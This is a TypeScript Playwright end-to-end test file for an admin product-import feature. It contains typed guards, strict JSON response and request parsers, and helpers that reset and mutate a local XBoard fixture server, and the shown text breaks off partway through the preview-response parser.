/**
 * e2e/catalog-xboard-import.spec.ts
 *
 * Catalog ↔ XBoard (external import board) integration spec — browser E2E
 * (preview → confirm → admin products list back-check, plus stale-preview
 * reject with zero product writes).
 *
 * This file defines the shared typed guards, fixtures, and response parsers
 * that the xboard import test() cases build on, and hosts three real-UI tests:
 *   - an admin confirms a stale Xboard preview after the fixture source was
 *     mutated and gets FAKA_SOURCE_CHANGED (409) with zero product writes;
 *   - three admin pages sharing one context replay the same Xboard request:
 *     A creates the draft (201 replayed:false), B gets the idempotent replay
 *     (200 replayed:true with the same productId), and C reuses the same key
 *     with only the top-level productName changed (offers identical to A/B)
 *     and is rejected (409 IDEMPOTENCY_KEY_REUSED);
 *   - an admin previews and confirms a sanitized Xboard draft, then the
 *     refreshed admin product list is re-verified against a strict typed DTO
 *     and the real DOM table.
 *
 * HTTP response predicates (method + exact pathname; expected query where noted):
 *   - isCatalogResponse        GET  /api/admin/faka/catalog
 *   - isRegistryResponse       GET  /api/config/registry
 *   - isImportPreviewResponse  POST /api/admin/faka/import/preview
 *   - isImportResponse         POST /api/admin/faka/import
 *   - isAdminProductsResponse  GET  /api/admin/products (archived omitted or exclude)
 *
 * Response parsers (strict, reject extra keys, throw clear errors):
 *   - parseFakaCatalogResponse      GET /api/admin/faka/catalog payload
 *   - parseCategoryRegistryResponse GET /api/config/registry payload
 *   - parseAdminProductsResponse    GET /api/admin/products payload
 *     (allows extra server keys; every required field is type-validated)
 *   - parseFakaConflictError        POST /api/admin/faka/import 409 payload
 *     (optional top-level requestId, exact { code, message })
 *
 * XBoard fixture controls (POST, no body, strict JSON validation, return
 * sourceHash; every unexpected response throws a fixed error):
 *   - resetXboardFixture()  POSTs http://127.0.0.1:3106/__fixture/reset
 *     { success: true, action: "reset", sourceHash: <64-char lowercase hex> }
 *   - mutateXboardFixture() POSTs http://127.0.0.1:3106/__fixture/mutate-source
 *     { success: true, action: "mutate-source", sourceHash: <64-char lowercase hex> }
 */

import { expect, test, type Page, type Request, type Response } from '@playwright/test';
import { API_BASE, SEED_ACCOUNTS, loginAs, loginAsApi } from './helpers';

const XBOARD_FIXTURE_RESET_URL = 'http://127.0.0.1:3106/__fixture/reset';
const XBOARD_FIXTURE_MUTATE_URL = 'http://127.0.0.1:3106/__fixture/mutate-source';

const FIXTURE_RESET_ERROR_MESSAGE =
  'XBoard fixture reset failed: unexpected response from __fixture/reset';
const FIXTURE_MUTATE_ERROR_MESSAGE =
  'XBoard fixture mutate failed: unexpected response from __fixture/mutate-source';

// ---------------------------------------------------------------------------
// Primitive guards
// ---------------------------------------------------------------------------

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === 'object' && value !== null && !Array.isArray(value);
}

function isPositiveInteger(value: unknown): value is number {
  return typeof value === 'number' && Number.isInteger(value) && value > 0;
}

function isNonNegativeInteger(value: unknown): value is number {
  return typeof value === 'number' && Number.isInteger(value) && value >= 0;
}

function isInteger(value: unknown): value is number {
  return typeof value === 'number' && Number.isInteger(value);
}

/**
 * 从真实分页响应取指定 canonical code 的稳定 category id。随后必须等待同 id 的
 * DOM 行出现，避免把 HTTP response 已到误认为 React 已完成表格渲染。
 */
function findCategoryIdOnListPage(value: unknown, expectedCode: string): number | null {
  if (!isRecord(value) || !Array.isArray(value.items)) {
    throw new Error('Category list response: expected an items array');
  }
  for (const item of value.items) {
    if (!isRecord(item) || !isPositiveInteger(item.id) || typeof item.code !== 'string') {
      throw new Error('Category list response: item is missing id or code');
    }
    if (item.code === expectedCode) return item.id;
  }
  return null;
}

function isNullableNonNegativeInteger(value: unknown): value is number | null {
  return value === null || isNonNegativeInteger(value);
}

/**
 * Asserts that `value` is a plain record whose key set is exactly `keys`.
 * Uses `context` to build a clear error on any mismatch; on success narrows
 * to the record.
 */
function assertExactKeys(
  value: unknown,
  keys: readonly string[],
  context: string,
): asserts value is Record<string, unknown> {
  if (!isRecord(value)) {
    const kind =
      value === null ? 'null' : Array.isArray(value) ? 'an array' : typeof value;
    throw new Error(`${context}: expected a plain object, got ${kind}`);
  }
  const actual = Object.keys(value);
  const missing = keys.filter((key) => !actual.includes(key));
  const extra = actual.filter((key) => !keys.includes(key));
  if (missing.length > 0 || extra.length > 0) {
    throw new Error(
      `${context}: expected exactly [${keys.join(', ')}], missing [${missing.join(', ')}], ` +
        `unexpected [${extra.join(', ')}]`,
    );
  }
}

// ---------------------------------------------------------------------------
// HTTP response predicates
// ---------------------------------------------------------------------------

/**
 * Builds a predicate matching a response whose request method and URL
 * pathname are exactly the given values.
 */
function exactResponse(method: string, pathname: string): (response: Response) => boolean {
  return (response: Response) =>
    response.request().method() === method && new URL(response.url()).pathname === pathname;
}

export const isCatalogResponse = exactResponse('GET', '/api/admin/faka/catalog');
export const isRegistryResponse = exactResponse('GET', '/api/config/registry');
/** Admin category list (with defaultCoverUrl) — what the Faka import dialog now loads. */
export const isAdminCategoriesResponse = exactResponse('GET', '/api/admin/product-categories');
export const isImportPreviewResponse = exactResponse('POST', '/api/admin/faka/import/preview');
export const isImportResponse = exactResponse('POST', '/api/admin/faka/import');
/**
 * Matches the default admin products list response: GET with exact pathname
 * /api/admin/products and archived either omitted or set to exclude. The admin
 * page now sends archived=exclude for its default "active products" view.
 */
export const isAdminProductsResponse = (response: Response): boolean => {
  const url = new URL(response.url());
  const archived = url.searchParams.get('archived');
  return response.request().method() === 'GET'
    && url.pathname === '/api/admin/products'
    && url.searchParams.size <= (archived === null ? 0 : 1)
    && (archived === null || archived === 'exclude');
};

export const isAdminReadinessResponse = (response: Response): boolean =>
  response.request().method() === 'GET'
  && /\/api\/admin\/products\/\d+\/readiness$/.test(new URL(response.url()).pathname);

export const isAdminPublishResponse = (response: Response): boolean =>
  response.request().method() === 'POST'
  && /\/api\/admin\/products\/\d+\/publish$/.test(new URL(response.url()).pathname);

function boxesOverlap(
  a: { x: number; y: number; width: number; height: number },
  b: { x: number; y: number; width: number; height: number },
): boolean {
  return a.x < b.x + b.width
    && a.x + a.width > b.x
    && a.y < b.y + b.height
    && a.y + a.height > b.y;
}

async function assertAdminProductRowReadable(
  page: Page,
  productName: string,
  viewport: { width: number; height: number },
): Promise<void> {
  await page.setViewportSize(viewport);
  const row = page.locator('tbody tr').filter({
    has: page.locator('td[data-label="商品名称"]').getByText(productName, { exact: true }),
  });
  await expect(row).toHaveCount(1);
  const name = row.locator('td[data-label="商品名称"]');
  const status = row.locator('td[data-label="状态"]');
  const actions = row.locator('td[data-label="操作"]');
  await expect(name).toBeVisible();
  await expect(status).toBeVisible();
  await expect(actions).toBeVisible();
  const [nameBox, statusBox, actionsBox, rowBox] = await Promise.all([
    name.boundingBox(),
    status.boundingBox(),
    actions.boundingBox(),
    row.boundingBox(),
  ]);
  if (!nameBox || !statusBox || !actionsBox || !rowBox) {
    throw new Error(`admin product row geometry missing at ${viewport.width}px`);
  }
  expect(boxesOverlap(nameBox, statusBox)).toBe(false);
  expect(boxesOverlap(nameBox, actionsBox)).toBe(false);
  expect(boxesOverlap(statusBox, actionsBox)).toBe(false);
  expect(rowBox.x + rowBox.width).toBeLessThanOrEqual(viewport.width + 1);
}

// ---------------------------------------------------------------------------
// XBoard fixture reset
// ---------------------------------------------------------------------------

/**
 * Resets the XBoard fixture server. Returns the reported sourceHash on
 * success; throws the fixed FIXTURE_RESET_ERROR_MESSAGE on any failure.
 */
export async function resetXboardFixture(): Promise<string> {
  const response = await fetch(XBOARD_FIXTURE_RESET_URL, { method: 'POST' });
  if (!response.ok) {
    throw new Error(FIXTURE_RESET_ERROR_MESSAGE);
  }

  let payload: unknown;
  try {
    payload = await response.json();
  } catch {
    throw new Error(FIXTURE_RESET_ERROR_MESSAGE);
  }

  assertExactKeys(payload, ['success', 'action', 'sourceHash'], FIXTURE_RESET_ERROR_MESSAGE);
  if (payload.success !== true || payload.action !== 'reset') {
    throw new Error(FIXTURE_RESET_ERROR_MESSAGE);
  }
  if (typeof payload.sourceHash !== 'string' || !/^[0-9a-f]{64}$/.test(payload.sourceHash)) {
    throw new Error(FIXTURE_RESET_ERROR_MESSAGE);
  }
  return payload.sourceHash;
}

/**
 * Mutates the XBoard fixture catalog source (plan 77 name/content/period
 * price flip). Returns the reported sourceHash on success; throws the fixed
 * FIXTURE_MUTATE_ERROR_MESSAGE on any failure.
 */
export async function mutateXboardFixture(): Promise<string> {
  const response = await fetch(XBOARD_FIXTURE_MUTATE_URL, { method: 'POST' });
  if (!response.ok) {
    throw new Error(FIXTURE_MUTATE_ERROR_MESSAGE);
  }

  let payload: unknown;
  try {
    payload = await response.json();
  } catch {
    throw new Error(FIXTURE_MUTATE_ERROR_MESSAGE);
  }

  assertExactKeys(payload, ['success', 'action', 'sourceHash'], FIXTURE_MUTATE_ERROR_MESSAGE);
  if (payload.success !== true || payload.action !== 'mutate-source') {
    throw new Error(FIXTURE_MUTATE_ERROR_MESSAGE);
  }
  if (typeof payload.sourceHash !== 'string' || !/^[0-9a-f]{64}$/.test(payload.sourceHash)) {
    throw new Error(FIXTURE_MUTATE_ERROR_MESSAGE);
  }
  return payload.sourceHash;
}

// ---------------------------------------------------------------------------
// Response parsers
// ---------------------------------------------------------------------------

export interface FakaCatalogPeriod {
  period: string;
  price: number;
  sku_alias: string;
}

export interface FakaCatalogNamedSku {
  sku: string;
  period: string;
}

export interface FakaCatalogPlan {
  plan_id: number;
  name: string;
  content: string | null;
  show: boolean;
  sell: boolean;
  renew: boolean;
  group_id: number | null;
  transfer_enable: number;
  capacity_limit: number | null;
  active_users: number;
  remaining: number | null;
  periods: FakaCatalogPeriod[];
  named_skus: FakaCatalogNamedSku[];
}

export interface FakaCatalogResponse {
  plans: FakaCatalogPlan[];
}

/**
 * Strictly parses the Faka catalog response payload.
 * Top level must be exactly { plans }; `plans` must be a non-empty array.
 * Each plan must be exactly { plan_id, name, content, show, sell, renew,
 * group_id, transfer_enable, capacity_limit, active_users, remaining, periods,
 * named_skus } with:
 *   - plan_id: positive integer, unique across plans
 *   - name: non-empty string; content: string or null
 *   - show/sell/renew: booleans
 *   - group_id/capacity_limit/remaining: null or non-negative integer
 *   - transfer_enable/active_users: non-negative integers
 *   - active_users: non-negative integer
 *   - periods: non-empty array of exactly { period, price, sku_alias } with
 *     non-empty string period/sku_alias, non-negative integer price, and
 *     period/sku_alias each unique within the plan
 *   - named_skus: array of exactly { sku, period } with non-empty strings,
 *     no repeated sku and no repeated (sku, period) pair within the plan
 * Rejects any extra key. Returns a fully typed object.
 */
export function parseFakaCatalogResponse(value: unknown): FakaCatalogResponse {
  assertExactKeys(value, ['plans'], 'Faka catalog response');
  const plans: unknown[] = value.plans;
  if (!Array.isArray(plans) || plans.length === 0) {
    throw new Error('Faka catalog response: "plans" must be a non-empty array');
  }

  const planIds = new Set<number>();
  const parsedPlans: FakaCatalogPlan[] = [];
  for (const plan of plans) {
    assertExactKeys(
      plan,
      [
        'plan_id',
        'name',
        'content',
        'show',
        'sell',
        'renew',
        'group_id',
        'transfer_enable',
        'capacity_limit',
        'active_users',
        'remaining',
        'periods',
        'named_skus',
      ],
      'Faka catalog response: plan',
    );

    if (!isPositiveInteger(plan.plan_id)) {
      throw new Error('Faka catalog response: plan.plan_id must be a positive integer');
    }
    if (planIds.has(plan.plan_id)) {
      throw new Error(`Faka catalog response: duplicate plan_id ${plan.plan_id}`);
    }
    planIds.add(plan.plan_id);

    if (typeof plan.name !== 'string' || plan.name.length === 0) {
      throw new Error('Faka catalog response: plan.name must be a non-empty string');
    }
    if (plan.content !== null && typeof plan.content !== 'string') {
      throw new Error('Faka catalog response: plan.content must be a string or null');
    }
    if (typeof plan.show !== 'boolean') {
      throw new Error('Faka catalog response: plan.show must be a boolean');
    }
    if (typeof plan.sell !== 'boolean') {
      throw new Error('Faka catalog response: plan.sell must be a boolean');
    }
    if (typeof plan.renew !== 'boolean') {
      throw new Error('Faka catalog response: plan.renew must be a boolean');
    }
    if (!isNullableNonNegativeInteger(plan.group_id)) {
      throw new Error('Faka catalog response: plan.group_id must be null or a non-negative integer');
    }
    if (!isNonNegativeInteger(plan.transfer_enable)) {
      throw new Error('Faka catalog response: plan.transfer_enable must be a non-negative integer');
    }
    if (!isNullableNonNegativeInteger(plan.capacity_limit)) {
      throw new Error('Faka catalog response: plan.capacity_limit must be null or a non-negative integer');
    }
    if (!isNonNegativeInteger(plan.active_users)) {
      throw new Error('Faka catalog response: plan.active_users must be a non-negative integer');
    }
    if (!isNullableNonNegativeInteger(plan.remaining)) {
      throw new Error('Faka catalog response: plan.remaining must be null or a non-negative integer');
    }

    const periods: unknown[] = plan.periods;
    if (!Array.isArray(periods) || periods.length === 0) {
      throw new Error('Faka catalog response: plan.periods must be a non-empty array');
    }
    const seenPeriods = new Set<string>();
    const seenSkuAliases = new Set<string>();
    const parsedPeriods: FakaCatalogPeriod[] = [];
    for (const period of periods) {
      assertExactKeys(
        period,
        ['period', 'price', 'sku_alias'],
        'Faka catalog response: plan.periods item',
      );
      if (typeof period.period !== 'string' || period.period.length === 0) {
        throw new Error('Faka catalog response: period.period must be a non-empty string');
      }
      if (seenPeriods.has(period.period)) {
        throw new Error(`Faka catalog response: duplicate period "${period.period}" within a plan`);
      }
      seenPeriods.add(period.period);
      if (!isNonNegativeInteger(period.price)) {
        throw new Error('Faka catalog response: period.price must be a non-negative integer');
      }
      if (typeof period.sku_alias !== 'string' || period.sku_alias.length === 0) {
        throw new Error('Faka catalog response: period.sku_alias must be a non-empty string');
      }
      if (seenSkuAliases.has(period.sku_alias)) {
        throw new Error(`Faka catalog response: duplicate sku_alias "${period.sku_alias}" within a plan`);
      }
      seenSkuAliases.add(period.sku_alias);
      parsedPeriods.push({
        period: period.period,
        price: period.price,
        sku_alias: period.sku_alias,
      });
    }

    const namedSkus: unknown[] = plan.named_skus;
    if (!Array.isArray(namedSkus)) {
      throw new Error('Faka catalog response: plan.named_skus must be an array');
    }
    const seenSkus = new Set<string>();
    const seenPairs = new Set<string>();
    const parsedNamedSkus: FakaCatalogNamedSku[] = [];
    for (const namedSku of namedSkus) {
      assertExactKeys(
        namedSku,
        ['sku', 'period'],
        'Faka catalog response: plan.named_skus item',
      );
      if (typeof namedSku.sku !== 'string' || namedSku.sku.length === 0) {
        throw new Error('Faka catalog response: named_skus.sku must be a non-empty string');
      }
      if (seenSkus.has(namedSku.sku)) {
        throw new Error(`Faka catalog response: duplicate sku "${namedSku.sku}" within a plan`);
      }
      seenSkus.add(namedSku.sku);
      if (typeof namedSku.period !== 'string' || namedSku.period.length === 0) {
        throw new Error('Faka catalog response: named_skus.period must be a non-empty string');
      }
      const pairKey = `${namedSku.sku}\u0000${namedSku.period}`;
      if (seenPairs.has(pairKey)) {
        throw new Error(
          `Faka catalog response: duplicate (sku, period) pair "${namedSku.sku}" / "${namedSku.period}" within a plan`,
        );
      }
      seenPairs.add(pairKey);
      parsedNamedSkus.push({ sku: namedSku.sku, period: namedSku.period });
    }

    parsedPlans.push({
      plan_id: plan.plan_id,
      name: plan.name,
      content: plan.content,
      show: plan.show,
      sell: plan.sell,
      renew: plan.renew,
      group_id: plan.group_id,
      transfer_enable: plan.transfer_enable,
      capacity_limit: plan.capacity_limit,
      active_users: plan.active_users,
      remaining: plan.remaining,
      periods: parsedPeriods,
      named_skus: parsedNamedSkus,
    });
  }

  return { plans: parsedPlans };
}

export interface CategoryRegistryItem {
  id: number;
  code: string;
  label: string;
  iconKey: string | null;
  sortOrder: number;
}

/**
 * Strictly parses the category registry response payload.
 * The top level may carry other (frozen) keys — only `productCategories` is
 * inspected and must be a non-empty array. Each item must be exactly
 * { id, code, label, iconKey, sortOrder } with:
 *   - id: positive integer, unique across items
 *   - code/label: non-empty strings
 *   - iconKey: string or null
 *   - sortOrder: integer
 * Rejects any extra key. Returns a fully typed array.
 */
export function parseCategoryRegistryResponse(value: unknown): CategoryRegistryItem[] {
  if (!isRecord(value)) {
    throw new Error('Category registry response: expected a plain object');
  }
  const productCategories: unknown[] = value.productCategories;
  if (!Array.isArray(productCategories) || productCategories.length === 0) {
    throw new Error('Category registry response: "productCategories" must be a non-empty array');
  }

  const ids = new Set<number>();
  const items: CategoryRegistryItem[] = [];
  for (const item of productCategories) {
    assertExactKeys(
      item,
      ['id', 'code', 'label', 'iconKey', 'sortOrder'],
      'Category registry response: productCategories item',
    );
    if (!isPositiveInteger(item.id)) {
      throw new Error('Category registry response: item.id must be a positive integer');
    }
    if (ids.has(item.id)) {
      throw new Error(`Category registry response: duplicate id ${item.id}`);
    }
    ids.add(item.id);
    if (typeof item.code !== 'string' || item.code.length === 0) {
      throw new Error('Category registry response: item.code must be a non-empty string');
    }
    if (typeof item.label !== 'string' || item.label.length === 0) {
      throw new Error('Category registry response: item.label must be a non-empty string');
    }
    if (item.iconKey !== null && typeof item.iconKey !== 'string') {
      throw new Error('Category registry response: item.iconKey must be a string or null');
    }
    if (!isInteger(item.sortOrder)) {
      throw new Error('Category registry response: item.sortOrder must be an integer');
    }
    items.push({
      id: item.id,
      code: item.code,
      label: item.label,
      iconKey: item.iconKey,
      sortOrder: item.sortOrder,
    });
  }

  return items;
}

/**
 * Parses the admin product-categories list response (what the Faka import
 * dialog loads to show category default covers). Top level is
 * `{ items, total, page, pageSize }`; each item is a CategoryAdminDto. Only
 * id/code/label are inspected.
 */
export function parseAdminCategoryListResponse(value: unknown): Array<{ id: number; code: string; label: string }> {
  if (!isRecord(value)) {
    throw new Error('Admin categories response: expected a plain object');
  }
  const items: unknown[] = value.items;
  if (!Array.isArray(items) || items.length === 0) {
    throw new Error('Admin categories response: "items" must be a non-empty array');
  }
  return items.map((item, index) => {
    if (!isRecord(item) || !isPositiveInteger(item.id) || typeof item.code !== 'string' || typeof item.label !== 'string') {
      throw new Error(`Admin categories response: items[${index}] must be { id, code, label }`);
    }
    return { id: item.id, code: item.code, label: item.label };
  });
}

// ---------------------------------------------------------------------------
// Faka import request parsers
// ---------------------------------------------------------------------------

export interface FakaImportOffer {
  period: string;
  pricePoints: number;
  sku?: string;
  offerName?: string;
  validityDays?: number | null;
}

export type FakaImportCoverRequest =
  | { mode: 'category_default' }
  | { mode: 'uploaded'; objectKey: string };

export interface FakaImportRequest {
  planId: number;
  productName: string;
  categoryId: number;
  cover: FakaImportCoverRequest;
  offers: FakaImportOffer[];
}

export interface FakaConfirmRequest extends FakaImportRequest {
  sourceHash: string;
}

/**
 * Asserts that `value` is a plain record containing every key in `required`
 * and no key outside the union of `required` and `optional`.
 */
function assertSubsetKeys(
  value: unknown,
  required: readonly string[],
  optional: readonly string[],
  context: string,
): asserts value is Record<string, unknown> {
  if (!isRecord(value)) {
    const kind =
      value === null ? 'null' : Array.isArray(value) ? 'an array' : typeof value;
    throw new Error(`${context}: expected a plain object, got ${kind}`);
  }
  const actual = Object.keys(value);
  const allowed = new Set([...required, ...optional]);
  const missing = required.filter((key) => !actual.includes(key));
  const extra = actual.filter((key) => !allowed.has(key));
  if (missing.length > 0 || extra.length > 0) {
    throw new Error(
      `${context}: expected keys [${required.join(', ')}] with optional [${optional.join(', ')}], ` +
        `missing [${missing.join(', ')}], unexpected [${extra.join(', ')}]`,
    );
  }
}

/**
 * Parses the shared Faka import fields `{ planId, productName, categoryId,
 * cover, offers }` (exactly those five keys) that both the import and confirm
 * request parsers build on. See parseFakaImportRequest for the field rules.
 */
function parseFakaImportFields(value: unknown, context: string): FakaImportRequest {
  assertExactKeys(
    value,
    ['planId', 'productName', 'categoryId', 'cover', 'offers'],
    context,
  );

  if (!isPositiveInteger(value.planId)) {
    throw new Error(`${context}: planId must be a positive integer`);
  }
  const planId = value.planId;
  if (!isPositiveInteger(value.categoryId)) {
    throw new Error(`${context}: categoryId must be a positive integer`);
  }
  const categoryId = value.categoryId;
  if (typeof value.productName !== 'string' || value.productName.length === 0) {
    throw new Error(`${context}: productName must be a non-empty string`);
  }
  const productName = value.productName;

  // cover may be { mode: 'category_default' } or { mode: 'uploaded', objectKey }
  // (SPEC-CMI-UX-001 §5.3: objectKey is the write/confirm trust anchor).
  let cover: FakaImportCoverRequest;
  if (value.cover.mode === 'category_default') {
    assertExactKeys(value.cover, ['mode'], `${context}: cover`);
    cover = { mode: 'category_default' };
  } else if (value.cover.mode === 'uploaded') {
    assertExactKeys(value.cover, ['mode', 'objectKey'], `${context}: cover`);
    if (typeof value.cover.objectKey !== 'string' || value.cover.objectKey.length === 0) {
      throw new Error(`${context}: cover.objectKey must be a non-empty string`);
    }
    cover = { mode: 'uploaded', objectKey: value.cover.objectKey };
  } else {
    throw new Error(`${context}: cover.mode must be "category_default" or "uploaded"`);
  }
  const offers: unknown[] = value.offers;
  if (!Array.isArray(offers) || offers.length === 0) {
    throw new Error(`${context}: "offers" must be a non-empty array`);
  }

  const seenPeriods = new Set<string>();
  const seenSkus = new Set<string>();
  const parsedOffers: FakaImportOffer[] = [];
  for (const offer of offers) {
    assertSubsetKeys(
      offer,
      ['period', 'pricePoints'],
      ['sku', 'offerName', 'validityDays'],
      `${context}: offers item`,
    );

    const period = offer.period;
    if (typeof period !== 'string' || period.length === 0) {
      throw new Error(`${context}: offers item period must be a non-empty string`);
    }
    if (seenPeriods.has(period)) {
      throw new Error(`${context}: duplicate period "${period}" in offers`);
    }
    seenPeriods.add(period);

    if (!isPositiveInteger(offer.pricePoints)) {
      throw new Error(`${context}: offers item pricePoints must be a positive integer`);
    }
    const pricePoints = offer.pricePoints;

    let sku: string | undefined;
    if (Object.prototype.hasOwnProperty.call(offer, 'sku')) {
      if (typeof offer.sku !== 'string' || offer.sku.length === 0) {
        throw new Error(`${context}: offers item sku must be a non-empty string when present`);
      }
      sku = offer.sku;
      if (seenSkus.has(sku)) {
        throw new Error(`${context}: duplicate sku "${sku}" in offers`);
      }
      seenSkus.add(sku);
    }

    let offerName: string | undefined;
    if (Object.prototype.hasOwnProperty.call(offer, 'offerName')) {
      if (typeof offer.offerName !== 'string' || offer.offerName.length === 0) {
        throw new Error(`${context}: offers item offerName must be a non-empty string when present`);
      }
      offerName = offer.offerName;
    }

    let validityDays: number | null | undefined;
    if (Object.prototype.hasOwnProperty.call(offer, 'validityDays')) {
      if (offer.validityDays !== null && !isPositiveInteger(offer.validityDays)) {
        throw new Error(`${context}: offers item validityDays must be a positive integer or null when present`);
      }
      validityDays = offer.validityDays;
    }

    parsedOffers.push({
      period,
      pricePoints,
      ...(sku !== undefined ? { sku } : {}),
      ...(offerName !== undefined ? { offerName } : {}),
      ...(validityDays !== undefined ? { validityDays } : {}),
    });
  }

  return {
    planId,
    productName,
    categoryId,
    cover,
    offers: parsedOffers,
  };
}

/**
 * Strictly parses a Faka import request payload.
 * Top level must be exactly { planId, productName, categoryId, cover, offers }:
 *   - planId/categoryId: positive integers
 *   - productName: non-empty string
 *   - cover: exactly { mode } with mode === "category_default"
 *   - offers: non-empty array; each item must contain period (non-empty string,
 *     unique across offers) and pricePoints (positive integer), and may contain
 *     sku (non-empty string, unique across offers when present), offerName
 *     (non-empty string), validityDays (positive integer or null). Any other
 *     key is rejected. Returns a fully typed object that only carries the
 *     optional keys that were actually present.
 */
export function parseFakaImportRequest(value: unknown): FakaImportRequest {
  return parseFakaImportFields(value, 'Faka import request');
}

/**
 * Strictly parses a Faka confirm request payload. Same shape as the import
 * request plus a sourceHash that must be a 64-character lowercase hex string.
 * Reuses the shared field parser by splitting the exact base fields out of the
 * payload, so the extra sourceHash key does not trip the base key check.
 */
export function parseFakaConfirmRequest(value: unknown): FakaConfirmRequest {
  assertExactKeys(
    value,
    ['planId', 'productName', 'categoryId', 'cover', 'offers', 'sourceHash'],
    'Faka confirm request',
  );
  if (typeof value.sourceHash !== 'string' || !/^[0-9a-f]{64}$/.test(value.sourceHash)) {
    throw new Error('Faka confirm request: sourceHash must be a 64-character lowercase hex string');
  }
  const base: Record<string, unknown> = {
    planId: value.planId,
    productName: value.productName,
    categoryId: value.categoryId,
    cover: value.cover,
    offers: value.offers,
  };
  const parsed = parseFakaImportFields(base, 'Faka confirm request');
  return { ...parsed, sourceHash: value.sourceHash };
}

// ---------------------------------------------------------------------------
// Faka import preview response parser
// ---------------------------------------------------------------------------

export interface FakaPreviewCapacity {
  limit: number | null;
  activeUsers: number;
  remaining: number | null;
  sellable: boolean;
}

export interface FakaPreviewCover {
  imageUrl: string;
  images: string[];
}

export interface FakaPreviewOffer {
  period: string;
  sku: string;
  offerName: string;
  pricePoints: number;
  validityDays: number | null;
}

export interface FakaPreviewIssue {
  code: string;
  field: string;
  message: string;
  action?: string;
}

export interface FakaPreviewResponse {
  sourceHash: string;
  capacity: FakaPreviewCapacity;
  productName: string;
  plainDescription: string;
  richDescription: string | null;
  cover: FakaPreviewCover | null;
  offers: FakaPreviewOffer[];
  issues: FakaPreviewIssue[];
  canConfirm: boolean;
  existingProductId: number | null;
  archived: boolean;
  suggestedActions: string[];
}

/**
 * Strictly parses the Faka import preview response payload.
 * Top level must be exactly { sourceHash, capacity, productName,
 * plainDescription, richDescription, cover, offers, issues, canConfirm,
 * existingProductId, archived, suggestedActions }:
 *   - sourceHash: 64-character lowercase hex string
 *   - capacity: exactly { limit, activeUsers, remaining, sellable } with
 *     limit/remaining null or non-negative integer, activeUsers non-negative
 *     integer, sellable boolean
 *   - productName: non-empty string
 *   - plainDescription: string
 *   - richDescription: string or null
 *   - cover: null or exactly { imageUrl, images } with non-empty string
 *     imageUrl and non-empty string array images whose first item equals
 *     imageUrl and contains no duplicates
 *   - offers: array; each item exactly { period, sku, offerName,
 *     pricePoints, validityDays } with non-empty strings period/sku/offerName,
 *     positive integer pricePoints, validityDays positive integer or null, and
 *     period/sku each unique across items
 *   - issues: array; each item exactly { code, field, message } plus optional
 *     action, all non-empty strings
 *   - canConfirm: boolean
 *   - existingProductId: positive integer or null
 *   - archived: boolean
 *   - suggestedActions: unique non-empty strings
 * Rejects any extra key. Returns a fully typed object.
 */
export function parseFakaPreviewResponse(value: unknown): FakaPreviewResponse {
  assertExactKeys(
    value,
    [
      'sourceHash',
      'capacity',
      'productName',
      'plainDescription',
      'richDescription',
      'cover',
      'offers',
      'issues',
      'canConfirm',
      'existingProductId',
      'archived',
      'suggestedActions',
    ],
    'Faka preview response',
  );

  if (typeof value.sourceHash !== 'string' || !/^[0-9a-f]{64}$/.test(value.sourceHash)) {
    throw new Error('Faka preview response: sourceHash must be a 64-character lowercase hex string');
  }
  if (typeof value.productName !== 'string' || value.productName.length === 0) {
    throw new Error('Faka preview response: productName must be a non-empty string');
  }
  if (typeof value.plainDescription !== 'string') {
    throw new Error('Faka preview response: plainDescription must be a string');
  }
  if (value.richDescription !== null && typeof value.richDescription !== 'string') {
    throw new Error('Faka preview response: richDescription must be a string or null');
  }
  if (typeof value.canConfirm !== 'boolean') {
    throw new Error('Faka preview response: canConfirm must be a boolean');
  }
  if (value.existingProductId !== null && !isPositiveInteger(value.existingProductId)) {
    throw new Error('Faka preview response: existingProductId must be a positive integer or null');
  }
  if (typeof value.archived !== 'boolean') {
    throw new Error('Faka preview response: archived must be a boolean');
  }
  if (!Array.isArray(value.suggestedActions)) {
    throw new Error('Faka preview response: suggestedActions must be an array');
  }
  const suggestedActions: string[] = [];
  const seenSuggestedActions = new Set<string>();
  for (const action of value.suggestedActions) {
    if (typeof action !== 'string' || action.length === 0) {
      throw new Error('Faka preview response: suggestedActions must contain only non-empty strings');
    }
    if (seenSuggestedActions.has(action)) {
      throw new Error(`Faka preview response: duplicate action "${action}" in suggestedActions`);
    }
    seenSuggestedActions.add(action);
    suggestedActions.push(action);
  }

  assertExactKeys(
    value.capacity,
    ['limit', 'activeUsers', 'remaining', 'sellable'],
    'Faka preview response: capacity',
  );
  if (!isNullableNonNegativeInteger(value.capacity.limit)) {
    throw new Error('Faka preview response: capacity.limit must be null or a non-negative integer');
  }
  if (!isNonNegativeInteger(value.capacity.activeUsers)) {
    throw new Error('Faka preview response: capacity.activeUsers must be a non-negative integer');
  }
  if (!isNullableNonNegativeInteger(value.capacity.remaining)) {
    throw new Error('Faka preview response: capacity.remaining must be null or a non-negative integer');
  }
  if (typeof value.capacity.sellable !== 'boolean') {
    throw new Error('Faka preview response: capacity.sellable must be a boolean');
  }

  let cover: FakaPreviewCover | null = null;
  if (value.cover !== null) {
    assertExactKeys(value.cover, ['imageUrl', 'images'], 'Faka preview response: cover');
    if (typeof value.cover.imageUrl !== 'string' || value.cover.imageUrl.length === 0) {
      throw new Error('Faka preview response: cover.imageUrl must be a non-empty string');
    }
    if (!Array.isArray(value.cover.images)) {
      throw new Error('Faka preview response: cover.images must be a non-empty array');
    }
    if (value.cover.images.length === 0) {
      throw new Error('Faka preview response: cover.images must be a non-empty array');
    }
    const rawImages: unknown[] = value.cover.images;
    const seenImages = new Set<string>();
    const parsedImages: string[] = [];
    for (const image of rawImages) {
      if (typeof image !== 'string' || image.length === 0) {
        throw new Error('Faka preview response: cover.images must contain only non-empty strings');
      }
      if (seenImages.has(image)) {
        throw new Error(`Faka preview response: duplicate image "${image}" in cover.images`);
      }
      seenImages.add(image);
      parsedImages.push(image);
    }
    if (parsedImages[0] !== value.cover.imageUrl) {
      throw new Error('Faka preview response: cover.images[0] must equal cover.imageUrl');
    }
    cover = { imageUrl: value.cover.imageUrl, images: parsedImages };
  }

  if (!Array.isArray(value.offers)) {
    throw new Error('Faka preview response: offers must be an array');
  }
  const rawOffers: unknown[] = value.offers;
  const seenPeriods = new Set<string>();
  const seenSkus = new Set<string>();
  const parsedOffers: FakaPreviewOffer[] = [];
  for (const offer of rawOffers) {
    assertExactKeys(
      offer,
      ['period', 'sku', 'offerName', 'pricePoints', 'validityDays'],
      'Faka preview response: offers item',
    );
    if (typeof offer.period !== 'string' || offer.period.length === 0) {
      throw new Error('Faka preview response: offers item period must be a non-empty string');
    }
